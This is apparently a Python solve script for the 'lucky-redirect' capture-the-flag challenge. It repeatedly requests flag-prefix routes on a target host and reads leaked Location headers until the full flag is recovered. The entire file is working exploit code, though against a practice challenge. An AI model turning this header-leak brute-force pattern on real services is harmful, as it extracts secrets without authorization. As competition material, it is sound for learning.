#!/usr/bin/env python3
"""
lucky-redirect — AlpacaHack Daily 2026-07-03

The app registers a route for every prefix of FLAG: /A, /A/l, /A/l/p, ...
On a hit, with prob 1/5 it redirects to url_for(next-prefix route) (whose path
contains one more flag char) and otherwise to /nope. The lucky redirect's
Location header therefore leaks the next character. Walk the chain from the
known prefix "Alpaca{", retrying each step until a non-/nope redirect appears,
until the final route returns the flag text.

Usage: python3 solve.py <host> <port>
"""
import sys, re, time, urllib.parse, http.client

HOST, PORT = sys.argv[1], int(sys.argv[2])

def get(path):
    c = http.client.HTTPConnection(HOST, PORT, timeout=15)
    c.request("GET", path)
    r = c.getresponse()
    body = r.read(200).decode(errors="replace")
    loc = r.getheader("Location")
    c.close()
    return r.status, loc, body

known = list("Alpaca{")
while True:
    path = "/" + "/".join(urllib.parse.quote(ch, safe="") for ch in known)
    status, loc, body = get(path)
    if status == 200 and "flag is" in body.lower():
        m = re.search(r"Alpaca\{[^}]*\}", body)
        print(m.group(0) if m else body)
        break
    if loc and "/nope" not in loc:
        segs = [urllib.parse.unquote(s) for s in loc.strip("/").split("/")]
        if len(segs) == len(known) + 1:
            known.append(segs[-1])
            sys.stderr.write("".join(known) + "\n")
    # else: unlucky -> retry same path
    time.sleep(0.01)
